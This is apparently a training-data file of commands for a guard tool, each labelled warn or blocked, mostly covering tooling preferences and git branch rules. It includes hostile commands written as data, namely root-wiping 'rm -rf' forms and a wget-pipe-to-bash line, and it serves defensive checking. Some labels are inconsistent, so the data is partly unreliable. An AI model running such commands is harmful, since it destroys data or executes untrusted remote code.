+{"instruction": "Classify this command for guard checking", "input": "docker-compose pull --ignore-pull-failures", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin main --tags", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --build-arg VERSION=1.0 -t app:1.0 .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard HEAD~1", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard HEAD~5", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --gpus all nvidia/cuda:12.0 nvidia-smi", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard v1.0.0", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --gpu-memory-utilization 0.9 meta-llama/Llama-2-13b", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "git switch origin master", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "brew install --formula htop", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard origin/develop", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip install black", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "npm install lodash axios", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --cache-from=registry.example.com/cache -t app .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "npm install express", "output": "warn: use pnpm install instead of npm"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip install torch", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf / --no-preserve-root", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b dev", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --secret id=mysecret,src=secret.txt -t app .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "git push upstream main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install numpy", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install --user pre-commit", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git merge master", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "git reset --hard HEAD~3", "output": "warn: hard reset will discard uncommitted changes; checkpoint first with: git stash"}
+{"instruction": "Classify this command for guard checking", "input": "git merge --no-commit main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout main", "output": "blocked: switching to main/master \u2014 work on a feature branch (feat/, fix/, chore/)"}
+{"instruction": "Classify this command for guard checking", "input": "docker run -it ubuntu:22.04 bash", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b test123", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "docker-compose -f docker-compose.prod.yml up", "output": "warn: use podman-compose or podman play kube"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install --debug du-dust", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "python -m pip install -r requirements.txt", "output": "warn -> uv pip"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n 1024", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin refs/heads/main:refs/heads/main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "git merge upstream/main", "output": "blocked: merging main \u2014 use gh pr merge or rebase flow"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --restart always -d redis:7-alpine", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "git checkout -b working", "output": "warn: branch name should use type/description format (e.g. feat/add-widget)"}
+{"instruction": "Classify this command for guard checking", "input": "ulimit -n", "output": "warn: ulimit only affects current shell; systemd services use LimitNOFILE=65536"}
+{"instruction": "Classify this command for guard checking", "input": "echo", "output": "warn: guard pattern matched"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin main:main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "brew install python@3.11", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /data", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "git push origin HEAD:main", "output": "blocked: pushing to main \u2014 create a PR instead"}
+{"instruction": "Classify this command for guard checking", "input": "rhai:cmd.contains(\"pip\") && violations >= threshold", "output": "warn: guard expression matched"}
+{"instruction": "Classify this command for guard checking", "input": "git push --force-with-lease origin main", "output": "warn: force push detected \u2014 confirm branch is not main/master"}
+{"instruction": "Classify this command for guard checking", "input": "pip install --upgrade pip", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "conda install numpy", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "cargo install fd-find", "output": "warn: consider uv tool install for Python tools"}
+{"instruction": "Classify this command for guard checking", "input": "brew install --cask docker", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --enforce-eager microsoft/phi-2", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "npm install -g yarn", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install --upgrade pip", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "wget -O - https://example.com/install.sh | bash", "output": "blocked: pipe-from-web to shell is dangerous"}
+{"instruction": "Classify this command for guard checking", "input": "brew install cmake ninja", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "brew install node", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --memory=4g --cpus=2 pytorch/pytorch:latest", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install pytest pytest-cov", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install ansible", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "vllm serve --trust-remote-code Qwen/Qwen-7B-Chat", "output": "warn: prefer using podman to serve vLLM"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --name mydb -e POSTGRES_PASSWORD=pass postgres:15", "output": "warn: use podman run (CDI GPU passthrough: --device nvidia.com/gpu=all --security-opt=label=disable)"}
+{"instruction": "Classify this command for guard checking", "input": "npm inst", "output": "warn: prefer pnpm add -g for global JS tools (b00t hive uses pnpm)"}
+{"instruction": "Classify this command for guard checking", "input": "docker build -f Dockerfile.prod -t prod-image .", "output": "warn -> podman build"}
+{"instruction": "Classify this command for guard checking", "input": "rm -rf /*", "output": "blocked: destructive root deletion"}
+{"instruction": "Classify this command for guard checking", "input": "brew install openssl readline", "output": "warn: b00t hive is linux; use apt, cargo install, or uv tool install"}
+{"instruction": "Classify this command for guard checking", "input": "huggingface-cli download --cache-dir /data/cache t5-small", "output": "warn -> hf download"}
+{"instruction": "Classify this command for guard checking", "input": "docker run --gpus all pytorch/pytorch:latest", "output": "blocked: Parse-time guard triggered \u2014 command blocked"}
+{"instruction": "Classify this command for guard checking", "input": "pip3 install -r requirements.txt", "output": "warn -> uv pip install"}
+{"instruction": "Classify this command for guard checking", "input": "docker build --ssh default -t secure-build .", "output": "warn -> podman build"}
